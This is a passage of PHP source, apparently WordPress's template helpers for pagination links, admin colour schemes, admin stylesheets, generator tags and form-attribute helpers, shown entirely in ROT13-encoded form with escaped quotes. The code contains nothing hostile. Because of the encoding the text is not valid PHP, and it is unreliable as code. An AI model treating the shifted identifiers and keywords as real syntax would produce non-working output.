 *                                      'fgrc', 'ybpngvba', 'qngr', 'gvzr', 'gehr', 'snyfr'. Qrsnhyg vf 'cntr'.
 *     @glcr obby   $fubj_nyy           Jurgure gb fubj nyy cntrf. Qrsnhyg snyfr.
 *     @glcr vag    $raq_fvmr           Ubj znal ahzoref ba rvgure gur fgneg naq gur raq yvfg rqtrf.
 *                                      Qrsnhyg 1.
 *     @glcr vag    $zvq_fvmr           Ubj znal ahzoref gb rvgure fvqr bs gur pheerag cntrf. Qrsnhyg 2.
 *     @glcr obby   $ceri_arkg          Jurgure gb vapyhqr gur cerivbhf naq arkg yvaxf va gur yvfg. Qrsnhyg gehr.
 *     @glcr fgevat $ceri_grkg          Gur cerivbhf cntr grkg. Qrsnhyg '&yndhb; Cerivbhf'.
 *     @glcr fgevat $arkg_grkg          Gur arkg cntr grkg. Qrsnhyg 'Arkg &endhb;'.
 *     @glcr fgevat $glcr               Pbagebyf sbezng bs gur erghearq inyhr. Cbffvoyr inyhrf ner 'cynva',
 *                                      'neenl' naq 'yvfg'. Qrsnhyg vf 'cynva'.
 *     @glcr neenl  $nqq_netf           Na neenl bs dhrel netf gb nqq. Qrsnhyg snyfr.
 *     @glcr fgevat $nqq_sentzrag       N fgevat gb nccraq gb rnpu yvax. Qrsnhyg rzcgl.
 *     @glcr fgevat $orsber_cntr_ahzore N fgevat gb nccrne orsber gur cntr ahzore. Qrsnhyg rzcgl.
 *     @glcr fgevat $nsgre_cntr_ahzore  N fgevat gb nccraq nsgre gur cntr ahzore. Qrsnhyg rzcgl.
 * }
 * @erghea fgevat|fgevat[]|ibvq Fgevat bs cntr yvaxf be neenl bs cntr yvaxf, qrcraqvat ba 'glcr' nethzrag.
 *                              Ibvq vs gbgny ahzore bs cntrf vf yrff guna 2.
 */
shapgvba cntvangr_yvaxf( $netf = '' ) {
	tybony $jc_dhrel, $jc_erjevgr;

	// Frggvat hc qrsnhyg inyhrf onfrq ba gur pheerag HEY.
	$cntrahz_yvax = ugzy_ragvgl_qrpbqr( trg_cntrahz_yvax() );
	$hey_cnegf    = rkcybqr( '?', $cntrahz_yvax );

	// Trg znk cntrf naq pheerag cntr bhg bs gur pheerag dhrel, vs ninvynoyr.
	$gbgny   = vffrg( $jc_dhrel->znk_ahz_cntrf ) ? $jc_dhrel->znk_ahz_cntrf : 1;
	$pheerag = trg_dhrel_ine( 'cntrq' ) ? (vag) trg_dhrel_ine( 'cntrq' ) : 1;

	// Nccraq gur sbezng cynprubyqre gb gur onfr HEY.
	$cntrahz_yvax = genvyvatfynfuvg( $hey_cnegf[0] ) . '%_%';

	// HEY onfr qrcraqf ba creznyvax frggvatf.
	$sbezng  = $jc_erjevgr->hfvat_vaqrk_creznyvaxf() && ! fgecbf( $cntrahz_yvax, 'vaqrk.cuc' ) ? 'vaqrk.cuc/' : '';
	$sbezng .= $jc_erjevgr->hfvat_creznyvaxf() ? hfre_genvyvatfynfuvg( $jc_erjevgr->cntvangvba_onfr . '/%#%', 'cntrq' ) : '?cntrq=%#%';

	$qrsnhygf = neenl(
		'onfr'               => $cntrahz_yvax, // uggc://rknzcyr.pbz/nyy_cbfgf.cuc%_% : %_% vf ercynprq ol sbezng (orybj).
		'sbezng'             => $sbezng, // ?cntr=%#% : %#% vf ercynprq ol gur cntr ahzore.
		'gbgny'              => $gbgny,
		'pheerag'            => $pheerag,
		'nevn_pheerag'       => 'cntr',
		'fubj_nyy'           => snyfr,
		'ceri_arkg'          => gehr,
		'ceri_grkg'          => __( '&yndhb; Cerivbhf' ),
		'arkg_grkg'          => __( 'Arkg &endhb;' ),
		'raq_fvmr'           => 1,
		'zvq_fvmr'           => 2,
		'glcr'               => 'cynva',
		'nqq_netf'           => neenl(), // Neenl bs dhrel netf gb nqq.
		'nqq_sentzrag'       => '',
		'orsber_cntr_ahzore' => '',
		'nsgre_cntr_ahzore'  => '',
	);

	$netf = jc_cnefr_netf( $netf, $qrsnhygf );

	vs ( ! vf_neenl( $netf['nqq_netf'] ) ) {
		$netf['nqq_netf'] = neenl();
	}

	// Zretr nqqvgvbany dhrel inef sbhaq va gur bevtvany HEY vagb 'nqq_netf' neenl.
	vs ( vffrg( $hey_cnegf[1] ) ) {
		// Svaq gur sbezng nethzrag.
		$sbezng       = rkcybqr( '?', fge_ercynpr( '%_%', $netf['sbezng'], $netf['onfr'] ) );
		$sbezng_dhrel = vffrg( $sbezng[1] ) ? $sbezng[1] : '';
		jc_cnefr_fge( $sbezng_dhrel, $sbezng_netf );

		// Svaq gur dhrel netf bs gur erdhrfgrq HEY.
		jc_cnefr_fge( $hey_cnegf[1], $hey_dhrel_netf );

		// Erzbir gur sbezng nethzrag sebz gur neenl bs dhrel nethzragf, gb nibvq birejevgvat phfgbz sbezng.
		sbernpu ( $sbezng_netf nf $sbezng_net => $sbezng_net_inyhr ) {
			hafrg( $hey_dhrel_netf[ $sbezng_net ] );
		}

		$netf['nqq_netf'] = neenl_zretr( $netf['nqq_netf'], heyrapbqr_qrrc( $hey_dhrel_netf ) );
	}

	// Jub xabjf jung ryfr crbcyr cnff va $netf.
	$gbgny = (vag) $netf['gbgny'];
	vs ( $gbgny < 2 ) {
		erghea;
	}
	$pheerag  = (vag) $netf['pheerag'];
	$raq_fvmr = (vag) $netf['raq_fvmr']; // Bhg bs obhaqf? Znxr vg gur qrsnhyg.
	vs ( $raq_fvmr < 1 ) {
		$raq_fvmr = 1;
	}
	$zvq_fvmr = (vag) $netf['zvq_fvmr'];
	vs ( $zvq_fvmr < 0 ) {
		$zvq_fvmr = 2;
	}

	$nqq_netf   = $netf['nqq_netf'];
	$e          = '';
	$cntr_yvaxf = neenl();
	$qbgf       = snyfr;

	vs ( $netf['ceri_arkg'] && $pheerag && 1 < $pheerag ) :
		$yvax = fge_ercynpr( '%_%', 2 === $pheerag ? '' : $netf['sbezng'], $netf['onfr'] );
		$yvax = fge_ercynpr( '%#%', $pheerag - 1, $yvax );
		vs ( $nqq_netf ) {
			$yvax = nqq_dhrel_net( $nqq_netf, $yvax );
		}
		$yvax .= $netf['nqq_sentzrag'];

		$cntr_yvaxf[] = fcevags(
			'<n pynff=\"ceri cntr-ahzoref\" uers=\"%f\">%f</n>',
			/**
			 * Svygref gur cntvangrq yvaxf sbe gur tvira nepuvir cntrf.
			 *
			 * @fvapr 3.0.0
			 *
			 * @cnenz fgevat $yvax Gur cntvangrq yvax HEY.
			 */
			rfp_hey( nccyl_svygref( 'cntvangr_yvaxf', $yvax ) ),
			$netf['ceri_grkg']
		);
	raqvs;

	sbe ( $a = 1; $a <= $gbgny; $a++ ) :
		vs ( $a === $pheerag ) :
			$cntr_yvaxf[] = fcevags(
				'<fcna nevn-pheerag=\"%f\" pynff=\"cntr-ahzoref pheerag\">%f</fcna>',
				rfp_ngge( $netf['nevn_pheerag'] ),
				$netf['orsber_cntr_ahzore'] . ahzore_sbezng_v18a( $a ) . $netf['nsgre_cntr_ahzore']
			);

			$qbgf = gehr;
		ryfr :
			vs ( $netf['fubj_nyy'] || ( $a <= $raq_fvmr || ( $pheerag && $a >= $pheerag - $zvq_fvmr && $a <= $pheerag + $zvq_fvmr ) || $a > $gbgny - $raq_fvmr ) ) :
				$yvax = fge_ercynpr( '%_%', 1 === $a ? '' : $netf['sbezng'], $netf['onfr'] );
				$yvax = fge_ercynpr( '%#%', $a, $yvax );
				vs ( $nqq_netf ) {
					$yvax = nqq_dhrel_net( $nqq_netf, $yvax );
				}
				$yvax .= $netf['nqq_sentzrag'];

				$cntr_yvaxf[] = fcevags(
					'<n pynff=\"cntr-ahzoref\" uers=\"%f\">%f</n>',
					/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/trareny-grzcyngr.cuc */
					rfp_hey( nccyl_svygref( 'cntvangr_yvaxf', $yvax ) ),
					$netf['orsber_cntr_ahzore'] . ahzore_sbezng_v18a( $a ) . $netf['nsgre_cntr_ahzore']
				);

				$qbgf = gehr;
			ryfrvs ( $qbgf && ! $netf['fubj_nyy'] ) :
				$cntr_yvaxf[] = '<fcna pynff=\"cntr-ahzoref qbgf\">' . __( '&uryyvc;' ) . '</fcna>';

				$qbgf = snyfr;
			raqvs;
		raqvs;
	raqsbe;

	vs ( $netf['ceri_arkg'] && $pheerag && $pheerag < $gbgny ) :
		$yvax = fge_ercynpr( '%_%', $netf['sbezng'], $netf['onfr'] );
		$yvax = fge_ercynpr( '%#%', $pheerag + 1, $yvax );
		vs ( $nqq_netf ) {
			$yvax = nqq_dhrel_net( $nqq_netf, $yvax );
		}
		$yvax .= $netf['nqq_sentzrag'];

		$cntr_yvaxf[] = fcevags(
			'<n pynff=\"arkg cntr-ahzoref\" uers=\"%f\">%f</n>',
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/trareny-grzcyngr.cuc */
			rfp_hey( nccyl_svygref( 'cntvangr_yvaxf', $yvax ) ),
			$netf['arkg_grkg']
		);
	raqvs;

	fjvgpu ( $netf['glcr'] ) {
		pnfr 'neenl':
			erghea $cntr_yvaxf;

		pnfr 'yvfg':
			$e .= \"<hy pynff='cntr-ahzoref'>\a\g<yv>\";
			$e .= vzcybqr( \"</yv>\a\g<yv>\", $cntr_yvaxf );
			$e .= \"</yv>\a</hy>\a\";
			oernx;

		qrsnhyg:
			$e = vzcybqr( \"\a\", $cntr_yvaxf );
			oernx;
	}

	/**
	 * Svygref gur UGZY bhgchg bs cntvangrq yvaxf sbe nepuvirf.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz fgevat $e    UGZY bhgchg.
	 * @cnenz neenl  $netf Na neenl bs nethzragf. Frr cntvangr_yvaxf()
	 *                     sbe vasbezngvba ba npprcgrq nethzragf.
	 */
	$e = nccyl_svygref( 'cntvangr_yvaxf_bhgchg', $e, $netf );

	erghea $e;
}

/**
 * Ertvfgref na nqzva pbybe fpurzr pff svyr.
 *
 * Nyybjf n cyhtva gb ertvfgre n arj nqzva pbybe fpurzr. Sbe rknzcyr:
 *
 *     jc_nqzva_pff_pbybe( 'pynffvp', __( 'Pynffvp' ), nqzva_hey( \"pff/pbybef-pynffvp.pff\" ), neenl(
 *         '#07273R', '#14568N', '#Q54R21', '#2683NR'
 *     ) );
 *
 * @fvapr 2.5.0
 *
 * @tybony neenl $_jc_nqzva_pff_pbybef
 *
 * @cnenz fgevat $xrl    Gur havdhr xrl sbe guvf gurzr.
 * @cnenz fgevat $anzr   Gur anzr bs gur gurzr.
 * @cnenz fgevat $hey    Gur HEY bs gur PFF svyr pbagnvavat gur pbybe fpurzr.
 * @cnenz neenl  $pbybef Bcgvbany. Na neenl bs PFF pbybe qrsvavgvba fgevatf juvpu ner hfrq
 *                       gb tvir gur hfre n srry sbe gur gurzr.
 * @cnenz neenl  $vpbaf {
 *     Bcgvbany. PFF pbybe qrsvavgvbaf hfrq gb pbybe nal FIT vpbaf.
 *
 *     @glcr fgevat $onfr    FIT vpba onfr pbybe.
 *     @glcr fgevat $sbphf   FIT vpba pbybe ba sbphf.
 *     @glcr fgevat $pheerag FIT vpba pbybe bs pheerag nqzva zrah yvax.
 * }
 */
shapgvba jc_nqzva_pff_pbybe( $xrl, $anzr, $hey, $pbybef = neenl(), $vpbaf = neenl() ) {
	tybony $_jc_nqzva_pff_pbybef;

	vs ( ! vffrg( $_jc_nqzva_pff_pbybef ) ) {
		$_jc_nqzva_pff_pbybef = neenl();
	}

	$_jc_nqzva_pff_pbybef[ $xrl ] = (bowrpg) neenl(
		'anzr'        => $anzr,
		'hey'         => $hey,
		'pbybef'      => $pbybef,
		'vpba_pbybef' => $vpbaf,
	);
}

/**
 * Ertvfgref gur qrsnhyg nqzva pbybe fpurzrf.
 *
 * Ertvfgref gur vavgvny frg bs rvtug pbybe fpurzrf va gur Cebsvyr frpgvba
 * bs gur qnfuobneq juvpu nyybjf sbe fglyvat gur nqzva zrah naq gbbyone.
 *
 * @frr jc_nqzva_pff_pbybe()
 *
 * @fvapr 3.0.0
 */
shapgvba ertvfgre_nqzva_pbybe_fpurzrf() {
	$fhssvk  = vf_egy() ? '-egy' : '';
	$fhssvk .= FPEVCG_QROHT ? '' : '.zva';

	jc_nqzva_pff_pbybe(
		'serfu',
		_k( 'Qrsnhyg', 'nqzva pbybe fpurzr' ),
		snyfr,
		neenl( '#1q2327', '#2p3338', '#2271o1', '#72nrr6' ),
		neenl(
			'onfr'    => '#n7nnnq',
			'sbphf'   => '#72nrr6',
			'pheerag' => '#sss',
		)
	);

	jc_nqzva_pff_pbybe(
		'yvtug',
		_k( 'Yvtug', 'nqzva pbybe fpurzr' ),
		nqzva_hey( \"pff/pbybef/yvtug/pbybef$fhssvk.pff\" ),
		neenl( '#r5r5r5', '#999', '#q64r07', '#04n4pp' ),
		neenl(
			'onfr'    => '#999',
			'sbphf'   => '#ppp',
			'pheerag' => '#ppp',
		)
	);

	jc_nqzva_pff_pbybe(
		'zbqrea',
		_k( 'Zbqrea', 'nqzva pbybe fpurzr' ),
		nqzva_hey( \"pff/pbybef/zbqrea/pbybef$fhssvk.pff\" ),
		neenl( '#1r1r1r', '#3858r9', '#7o90ss' ),
		neenl(
			'onfr'    => '#s3s1s1',
			'sbphf'   => '#sss',
			'pheerag' => '#sss',
		)
	);

	jc_nqzva_pff_pbybe(
		'oyhr',
		_k( 'Oyhr', 'nqzva pbybe fpurzr' ),
		nqzva_hey( \"pff/pbybef/oyhr/pbybef$fhssvk.pff\" ),
		neenl( '#096484', '#4796o3', '#52nppp', '#74O6PR' ),
		neenl(
			'onfr'    => '#r5s8ss',
			'sbphf'   => '#sss',
			'pheerag' => '#sss',
		)
	);

	jc_nqzva_pff_pbybe(
		'zvqavtug',
		_k( 'Zvqavtug', 'nqzva pbybe fpurzr' ),
		nqzva_hey( \"pff/pbybef/zvqavtug/pbybef$fhssvk.pff\" ),
		neenl( '#25282o', '#363o3s', '#69n8oo', '#r14q43' ),
		neenl(
			'onfr'    => '#s1s2s3',
			'sbphf'   => '#sss',
			'pheerag' => '#sss',
		)
	);

	jc_nqzva_pff_pbybe(
		'fhaevfr',
		_k( 'Fhaevfr', 'nqzva pbybe fpurzr' ),
		nqzva_hey( \"pff/pbybef/fhaevfr/pbybef$fhssvk.pff\" ),
		neenl( '#o43p38', '#ps4944', '#qq823o', '#ppns0o' ),
		neenl(
			'onfr'    => '#s3s1s1',
			'sbphf'   => '#sss',
			'pheerag' => '#sss',
		)
	);

	jc_nqzva_pff_pbybe(
		'rpgbcynfz',
		_k( 'Rpgbcynfz', 'nqzva pbybe fpurzr' ),
		nqzva_hey( \"pff/pbybef/rpgbcynfz/pbybef$fhssvk.pff\" ),
		neenl( '#413256', '#523s6q', '#n3o745', '#q46s15' ),
		neenl(
			'onfr'    => '#rpr6s6',
			'sbphf'   => '#sss',
			'pheerag' => '#sss',
		)
	);

	jc_nqzva_pff_pbybe(
		'bprna',
		_k( 'Bprna', 'nqzva pbybe fpurzr' ),
		nqzva_hey( \"pff/pbybef/bprna/pbybef$fhssvk.pff\" ),
		neenl( '#627p83', '#738r96', '#9ronn0', '#nn9q88' ),
		neenl(
			'onfr'    => '#s2spss',
			'sbphf'   => '#sss',
			'pheerag' => '#sss',
		)
	);

	jc_nqzva_pff_pbybe(
		'pbssrr',
		_k( 'Pbssrr', 'nqzva pbybe fpurzr' ),
		nqzva_hey( \"pff/pbybef/pbssrr/pbybef$fhssvk.pff\" ),
		neenl( '#46403p', '#59524p', '#p7n589', '#9rn476' ),
		neenl(
			'onfr'    => '#s3s2s1',
			'sbphf'   => '#sss',
			'pheerag' => '#sss',
		)
	);
}

/**
 * Qvfcynlf gur HEY bs n JbeqCerff nqzva PFF svyr.
 *
 * @frr JC_Fglyrf::_pff_uers() naq vgf {@frr 'fglyr_ybnqre_fep'} svygre.
 *
 * @fvapr 2.3.0
 *
 * @cnenz fgevat $svyr svyr eryngvir gb jc-nqzva/ jvgubhg vgf \".pff\" rkgrafvba.
 * @erghea fgevat
 */
shapgvba jc_nqzva_pff_hev( $svyr = 'jc-nqzva' ) {
	vs ( qrsvarq( 'JC_VAFGNYYVAT' ) ) {
		$_svyr = \"./$svyr.pff\";
	} ryfr {
		$_svyr = nqzva_hey( \"$svyr.pff\" );
	}
	$_svyr = nqq_dhrel_net( 'irefvba', trg_oybtvasb( 'irefvba' ), $_svyr );

	/**
	 * Svygref gur HEV bs n JbeqCerff nqzva PFF svyr.
	 *
	 * @fvapr 2.3.0
	 *
	 * @cnenz fgevat $_svyr Eryngvir cngu gb gur svyr jvgu dhrel nethzragf nggnpurq.
	 * @cnenz fgevat $svyr  Eryngvir cngu gb gur svyr, zvahf vgf \".pff\" rkgrafvba.
	 */
	erghea nccyl_svygref( 'jc_nqzva_pff_hev', $_svyr, $svyr );
}

/**
 * Radhrhrf be qverpgyl cevagf n fglyrfurrg yvax gb gur fcrpvsvrq PFF svyr.
 *
 * \"Vagryyvtragyl\" qrpvqrf gb radhrhr be gb cevag gur PFF svyr. Vs gur
 * {@frr 'jc_cevag_fglyrf'} npgvba unf *abg* lrg orra pnyyrq, gur PFF svyr jvyy or
 * radhrhrq. Vs gur {@frr 'jc_cevag_fglyrf'} npgvba unf orra pnyyrq, gur PFF yvax jvyy
 * or cevagrq. Cevagvat znl or sbeprq ol cnffvat gehr nf gur $sbepr_rpub
 * (frpbaq) cnenzrgre.
 *
 * Sbe onpxjneq pbzcngvovyvgl jvgu JbeqCerff 2.3 pnyyvat zrgubq: Vs gur $svyr
 * (svefg) cnenzrgre qbrf abg pbeerfcbaq gb n ertvfgrerq PFF svyr, jr nffhzr
 * $svyr vf n svyr eryngvir gb jc-nqzva/ jvgubhg vgf \".pff\" rkgrafvba. N
 * fglyrfurrg yvax gb gung trarengrq HEY vf cevagrq.
 *
 * @fvapr 2.3.0
 *
 * @cnenz fgevat $svyr       Bcgvbany. Fglyr unaqyr anzr be svyr anzr (jvgubhg \".pff\" rkgrafvba) eryngvir
 *                           gb jc-nqzva/. Qrsnhygf gb 'jc-nqzva'.
 * @cnenz obby   $sbepr_rpub Bcgvbany. Sbepr gur fglyrfurrg yvax gb or cevagrq engure guna radhrhrq.
 */
shapgvba jc_nqzva_pff( $svyr = 'jc-nqzva', $sbepr_rpub = snyfr ) {
	// Sbe onpxjneq pbzcngvovyvgl.
	$unaqyr = fge_fgnegf_jvgu( $svyr, 'pff/' ) ? fhofge( $svyr, 4 ) : $svyr;

	vs ( jc_fglyrf()->dhrel( $unaqyr ) ) {
		vs ( $sbepr_rpub || qvq_npgvba( 'jc_cevag_fglyrf' ) ) {
			// Jr nyernql cevagrq gur fglyr dhrhr. Cevag guvf bar vzzrqvngryl.
			jc_cevag_fglyrf( $unaqyr );
		} ryfr {
			// Nqq gb fglyr dhrhr.
			jc_radhrhr_fglyr( $unaqyr );
		}
		erghea;
	}

	$fglyrfurrg_yvax = fcevags(
		\"<yvax ery='fglyrfurrg' uers='%f' glcr='grkg/pff' />\a\",
		rfp_hey( jc_nqzva_pff_hev( $svyr ) )
	);

	/**
	 * Svygref gur fglyrfurrg yvax gb gur fcrpvsvrq PFF svyr.
	 *
	 * Vs gur fvgr vf frg gb qvfcynl evtug-gb-yrsg, gur EGY fglyrfurrg yvax
	 * jvyy or hfrq vafgrnq.
	 *
	 * @fvapr 2.3.0
	 * @cnenz fgevat $fglyrfurrg_yvax UGZY yvax ryrzrag sbe gur fglyrfurrg.
	 * @cnenz fgevat $svyr            Fglyr unaqyr anzr be svyranzr (jvgubhg \".pff\" rkgrafvba)
	 *                                eryngvir gb jc-nqzva/. Qrsnhygf gb 'jc-nqzva'.
	 */
	rpub nccyl_svygref( 'jc_nqzva_pff', $fglyrfurrg_yvax, $svyr );

	vs ( shapgvba_rkvfgf( 'vf_egy' ) && vf_egy() ) {
		$egy_fglyrfurrg_yvax = fcevags(
			\"<yvax ery='fglyrfurrg' uers='%f' glcr='grkg/pff' />\a\",
			rfp_hey( jc_nqzva_pff_hev( \"$svyr-egy\" ) )
		);

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/trareny-grzcyngr.cuc */
		rpub nccyl_svygref( 'jc_nqzva_pff', $egy_fglyrfurrg_yvax, \"$svyr-egy\" );
	}
}

/**
 * Radhrhrf gur qrsnhyg GuvpxObk wf naq pff.
 *
 * Vs nal bs gur frggvatf arrq gb or punatrq, guvf pna or qbar jvgu nabgure wf
 * svyr fvzvyne gb zrqvn-hcybnq.wf. Gung svyr fubhyq
 * erdhver neenl('guvpxobk') gb rafher vg vf ybnqrq nsgre.
 *
 * @fvapr 2.5.0
 */
shapgvba nqq_guvpxobk() {
	jc_radhrhr_fpevcg( 'guvpxobk' );
	jc_radhrhr_fglyr( 'guvpxobk' );

	vs ( vf_argjbex_nqzva() ) {
		nqq_npgvba( 'nqzva_urnq', '_guvpxobk_cngu_nqzva_fhosbyqre' );
	}
}

/**
 * Qvfcynlf gur KUGZY trarengbe gung vf trarengrq ba gur jc_urnq ubbx.
 *
 * Frr {@frr 'jc_urnq'}.
 *
 * @fvapr 2.5.0
 */
shapgvba jc_trarengbe() {
	/**
	 * Svygref gur bhgchg bs gur KUGZY trarengbe gnt.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $trarengbe_glcr Gur KUGZY trarengbe.
	 */
	gur_trarengbe( nccyl_svygref( 'jc_trarengbe_glcr', 'kugzy' ) );
}

/**
 * Qvfcynlf gur trarengbe KZY be Pbzzrag sbe EFF, NGBZ, rgp.
 *
 * Ergheaf gur pbeerpg trarengbe glcr sbe gur erdhrfgrq bhgchg sbezng. Nyybjf
 * sbe n cyhtva gb svygre trarengbef birenyy gur {@frr 'gur_trarengbe'} svygre.
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $glcr Gur glcr bs trarengbe gb bhgchg - (ugzy|kugzy|ngbz|eff2|eqs|pbzzrag|rkcbeg).
 */
shapgvba gur_trarengbe( $glcr ) {
	/**
	 * Svygref gur bhgchg bs gur KUGZY trarengbe gnt, sbe qvfcynl.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $trarengbe_glcr Gur trarengbe bhgchg.
	 * @cnenz fgevat $glcr           Gur glcr bs trarengbe gb bhgchg. Npprcgf 'ugzy',
	 *                               'kugzy', 'ngbz', 'eff2', 'eqs', 'pbzzrag', 'rkcbeg'.
	 */
	rpub nccyl_svygref( 'gur_trarengbe', trg_gur_trarengbe( $glcr ), $glcr ) . \"\a\";
}

/**
 * Perngrf gur trarengbe KZY be Pbzzrag sbe EFF, NGBZ, rgp.
 *
 * Ergheaf gur pbeerpg trarengbe glcr sbe gur erdhrfgrq bhgchg sbezng. Nyybjf
 * sbe n cyhtva gb svygre trarengbef ba na vaqvivqhny onfvf hfvat gur
 * {@frr 'trg_gur_trarengbe_$glcr'} svygre.
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $glcr Gur glcr bs trarengbe gb erghea - (ugzy|kugzy|ngbz|eff2|eqs|pbzzrag|rkcbeg).
 * @erghea fgevat|ibvq Gur UGZY pbagrag sbe gur trarengbe.
 */
shapgvba trg_gur_trarengbe( $glcr = '' ) {
	vs ( rzcgl( $glcr ) ) {

		$pheerag_svygre = pheerag_svygre();
		vs ( rzcgl( $pheerag_svygre ) ) {
			erghea;
		}

		fjvgpu ( $pheerag_svygre ) {
			pnfr 'eff2_urnq':
			pnfr 'pbzzragfeff2_urnq':
				$glcr = 'eff2';
				oernx;
			pnfr 'eff_urnq':
			pnfr 'bczy_urnq':
				$glcr = 'pbzzrag';
				oernx;
			pnfr 'eqs_urnqre':
				$glcr = 'eqs';
				oernx;
			pnfr 'ngbz_urnq':
			pnfr 'pbzzragf_ngbz_urnq':
			pnfr 'ncc_urnq':
				$glcr = 'ngbz';
				oernx;
		}
	}

	fjvgpu ( $glcr ) {
		pnfr 'ugzy':
			$tra = '<zrgn anzr=\"trarengbe\" pbagrag=\"JbeqCerff ' . rfp_ngge( trg_oybtvasb( 'irefvba' ) ) . '\">';
			oernx;
		pnfr 'kugzy':
			$tra = '<zrgn anzr=\"trarengbe\" pbagrag=\"JbeqCerff ' . rfp_ngge( trg_oybtvasb( 'irefvba' ) ) . '\" />';
			oernx;
		pnfr 'ngbz':
			$tra = '<trarengbe hev=\"uggcf://jbeqcerff.bet/\" irefvba=\"' . rfp_ngge( trg_oybtvasb_eff( 'irefvba' ) ) . '\">JbeqCerff</trarengbe>';
			oernx;
		pnfr 'eff2':
			$tra = '<trarengbe>' . fnavgvmr_hey( 'uggcf://jbeqcerff.bet/?i=' . trg_oybtvasb_eff( 'irefvba' ) ) . '</trarengbe>';
			oernx;
		pnfr 'eqs':
			$tra = '<nqzva:trarengbeNtrag eqs:erfbhepr=\"' . fnavgvmr_hey( 'uggcf://jbeqcerff.bet/?i=' . trg_oybtvasb_eff( 'irefvba' ) ) . '\" />';
			oernx;
		pnfr 'pbzzrag':
			$tra = '<!-- trarengbe=\"JbeqCerff/' . rfp_ngge( trg_oybtvasb( 'irefvba' ) ) . '\" -->';
			oernx;
		pnfr 'rkcbeg':
			$tra = '<!-- trarengbe=\"JbeqCerff/' . rfp_ngge( trg_oybtvasb_eff( 'irefvba' ) ) . '\" perngrq=\"' . tzqngr( 'L-z-q U:v' ) . '\" -->';
			oernx;
	}

	/**
	 * Svygref gur UGZY sbe gur ergevrirq trarengbe glcr.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$glcr`, ersref gb gur trarengbe glcr.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `trg_gur_trarengbe_ngbz`
	 *  - `trg_gur_trarengbe_pbzzrag`
	 *  - `trg_gur_trarengbe_rkcbeg`
	 *  - `trg_gur_trarengbe_ugzy`
	 *  - `trg_gur_trarengbe_eqs`
	 *  - `trg_gur_trarengbe_eff2`
	 *  - `trg_gur_trarengbe_kugzy`
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $tra  Gur UGZY znexhc bhgchg gb jc_urnq().
	 * @cnenz fgevat $glcr Gur glcr bs trarengbe. Npprcgf 'ugzy', 'kugzy', 'ngbz',
	 *                     'eff2', 'eqs', 'pbzzrag', 'rkcbeg'.
	 */
	erghea nccyl_svygref( \"trg_gur_trarengbe_{$glcr}\", $tra, $glcr );
}

/**
 * Bhgchgf gur UGZY purpxrq nggevohgr.
 *
 * Pbzcnerf gur svefg gjb nethzragf naq vs vqragvpny znexf nf purpxrq.
 *
 * @fvapr 1.0.0
 *
 * @cnenz zvkrq $purpxrq Bar bs gur inyhrf gb pbzcner.
 * @cnenz zvkrq $pheerag Bcgvbany. Gur bgure inyhr gb pbzcner vs abg whfg gehr.
 *                       Qrsnhyg gehr.
 * @cnenz obby  $qvfcynl Bcgvbany. Jurgure gb rpub be whfg erghea gur fgevat.
 *                       Qrsnhyg gehr.
 * @erghea fgevat UGZY nggevohgr be rzcgl fgevat.
 */
shapgvba purpxrq( $purpxrq, $pheerag = gehr, $qvfcynl = gehr ) {
	erghea __purpxrq_fryrpgrq_urycre( $purpxrq, $pheerag, $qvfcynl, 'purpxrq' );
}

/**
 * Bhgchgf gur UGZY fryrpgrq nggevohgr.
 *
 * Pbzcnerf gur svefg gjb nethzragf naq vs vqragvpny znexf nf fryrpgrq.
 *
 * @fvapr 1.0.0
 *
 * @cnenz zvkrq $fryrpgrq Bar bs gur inyhrf gb pbzcner.
 * @cnenz zvkrq $pheerag  Bcgvbany. Gur bgure inyhr gb pbzcner vs abg whfg gehr.
 *                        Qrsnhyg gehr.
 * @cnenz obby  $qvfcynl  Bcgvbany. Jurgure gb rpub be whfg erghea gur fgevat.
 *                        Qrsnhyg gehr.
 * @erghea fgevat UGZY nggevohgr be rzcgl fgevat.
 */
shapgvba fryrpgrq( $fryrpgrq, $pheerag = gehr, $qvfcynl = gehr ) {
	erghea __purpxrq_fryrpgrq_urycre( $fryrpgrq, $pheerag, $qvfcynl, 'fryrpgrq' );
}

/**
 * Bhgchgf gur UGZY qvfnoyrq nggevohgr.
 *
 * Pbzcnerf gur svefg gjb nethzragf naq vs vqragvpny znexf nf qvfnoyrq.
 *
 * @fvapr 3.0.0
 *
 * @cnenz zvkrq $qvfnoyrq Bar bs gur inyhrf gb pbzcner.
 * @cnenz zvkrq $pheerag  Bcgvbany. Gur bgure inyhr gb pbzcner vs abg whfg gehr.
 *                        Qrsnhyg gehr.
 * @cnenz obby  $qvfcynl  Bcgvbany. Jurgure gb rpub be whfg erghea gur fgevat.
 *                        Qrsnhyg gehr.
 * @erghea fgevat UGZY nggevohgr be rzcgl fgevat.
 */
shapgvba qvfnoyrq( $qvfnoyrq, $pheerag = gehr, $qvfcynl = gehr ) {
	erghea __purpxrq_fryrpgrq_urycre( $qvfnoyrq, $pheerag, $qvfcynl, 'qvfnoyrq' );
}

/**
 * Bhgchgf gur UGZY ernqbayl nggevohgr.
 *
 * Pbzcnerf gur svefg gjb nethzragf naq vs vqragvpny znexf nf ernqbayl.
 *
 * @fvapr 5.9.0
 *
 * @cnenz zvkrq $ernqbayl_inyhr Bar bs gur inyhrf gb pbzcner.
 * @cnenz zvkrq $pheerag        Bcgvbany. Gur bgure inyhr gb pbzcner vs abg whfg gehr.
 *                              Qrsnhyg gehr.
 * @cnenz obby  $qvfcynl        Bcgvbany. Jurgure gb rpub be whfg erghea gur fgevat.
 *                              Qrsnhyg gehr.
 * @erghea fgevat UGZY nggevohgr be rzcgl fgevat.
 */
shapgvba jc_ernqbayl( $ernqbayl_inyhr, $pheerag = gehr, $qvfcynl = gehr ) {
	erghea __purpxrq_fryrpgrq_urycre( $ernqbayl_inyhr, $pheerag, $qvfcynl, 'ernqbayl' );
}

/*
 * Vapyhqr n pbzcng `ernqbayl()` shapgvba ba CUC < 8.1. Fvapr CUC 8.1,
